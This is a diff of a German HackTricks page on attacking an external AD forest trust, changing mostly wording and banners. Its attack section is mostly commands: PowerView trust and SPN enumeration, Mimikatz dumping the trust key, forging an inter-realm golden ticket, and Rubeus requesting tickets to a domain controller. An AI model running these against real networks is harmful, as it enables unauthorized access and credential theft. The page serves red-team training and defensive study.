@@ -1,22 +1,25 @@
-# Externe Forest-Domäne - Einseitig (Eingehend) oder bidirektional
+# Externer Forest-Domain - Einweg (Inbound) oder bidirektional
+
+{% hint style="success" %}
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
-* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** senden.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
+{% endhint %}
 
-In diesem Szenario vertraut Ihnen eine externe Domäne (oder beide vertrauen sich gegenseitig), sodass Sie darauf zugreifen können.
+In diesem Szenario vertraut dir eine externe Domäne (oder beide vertrauen sich gegenseitig), sodass du eine Art Zugriff darauf erhalten kannst.
 
-## Enumeration
+## Aufzählung
 
-Zunächst müssen Sie das **Vertrauen** zwischen den Domänen **ermitteln**:
+Zuerst musst du die **Vertrauensstellung** **aufzählen**:
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -66,13 +69,13 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-In der vorherigen Aufzählung wurde festgestellt, dass der Benutzer **`crossuser`** in der Gruppe **`External Admins`** ist, die **Admin-Zugriff** auf den **DC der externen Domäne** hat.
+In der vorherigen Enumeration wurde festgestellt, dass der Benutzer **`crossuser`** in der Gruppe **`External Admins`** ist, die **Admin-Zugriff** im **DC der externen Domäne** hat.
 
 ## Erster Zugriff
 
-Wenn Sie **keinen** besonderen Zugriff auf Ihren Benutzer in der anderen Domäne gefunden haben, können Sie immer noch zur AD-Methodik zurückkehren und versuchen, **privilegierte Rechte von einem nicht privilegierten Benutzer** zu erlangen (zum Beispiel durch Kerberoasting):
+Wenn Sie **keinen** **besonderen** Zugriff Ihres Benutzers in der anderen Domäne finden konnten, können Sie immer noch zur AD-Methodologie zurückkehren und versuchen, **privesc von einem unprivilegierten Benutzer** (Dinge wie Kerberoasting zum Beispiel):
 
-Sie können **Powerview-Funktionen** verwenden, um die **andere Domäne** mit dem `-Domain`-Parameter aufzulisten, wie zum Beispiel:
+Sie können **Powerview-Funktionen** verwenden, um die **andere Domäne** mit dem `-Domain`-Parameter zu **enumerieren**, wie in:
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -80,28 +83,28 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 [.](./)
 {% endcontent-ref %}
 
-## Impersonation
+## Identitätsübernahme
 
 ### Anmeldung
 
-Mit einer regulären Methode und den Anmeldeinformationen des Benutzers, der Zugriff auf die externe Domäne hat, sollten Sie Zugriff erhalten können:
+Mit einer regulären Methode und den Anmeldeinformationen der Benutzer, die Zugriff auf die externe Domäne haben, sollten Sie in der Lage sein, auf Folgendes zuzugreifen:
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-### SID-History-Missbrauch
+### SID-Historie-Missbrauch
 
-Sie können auch [**SID-History**](sid-history-injection.md) über eine Forest-Trust-Beziehung missbrauchen.
+Sie könnten auch [**SID-Historie**](sid-history-injection.md) über ein Waldvertrauen missbrauchen.
 
-Wenn ein Benutzer **von einem Forest in einen anderen** migriert wird und **SID-Filterung nicht aktiviert ist**, wird es möglich, eine **SID aus dem anderen Forest hinzuzufügen**. Diese **SID** wird dem **Token des Benutzers** hinzugefügt, wenn er sich **über die Trust-Beziehung** authentifiziert.
+Wenn ein Benutzer **von einem Wald zu einem anderen** migriert wird und **SID-Filterung nicht aktiviert ist**, wird es möglich, eine **SID aus dem anderen Wald** hinzuzufügen, und diese **SID** wird dem **Token des Benutzers** beim Authentifizieren **über das Vertrauen** hinzugefügt.
 
 {% hint style="warning" %}
-Als Erinnerung: Sie können den Signierungsschlüssel mit dem folgenden Befehl erhalten:
+Zur Erinnerung, Sie können den Signaturschlüssel mit
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 ```
 {% endhint %}
 
-Sie könnten sich mit dem vertrauenswürdigen Schlüssel anmelden und ein TGT impersonieren, das den Benutzer der aktuellen Domäne darstellt.
+Sie könnten mit dem **vertrauenswürdigen** Schlüssel ein **TGT, das** den Benutzer der aktuellen Domäne **imitiert**, **signieren**.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -112,9 +115,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Vollständige Methode zur Benutzerimitation
-
-In dieser Methode wird versucht, den Benutzer vollständig zu imitieren.
+### Vollständige Möglichkeit, den Benutzer zu impersonieren
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -128,14 +129,17 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
+{% hint style="success" %}
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
-* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
+{% endhint %}
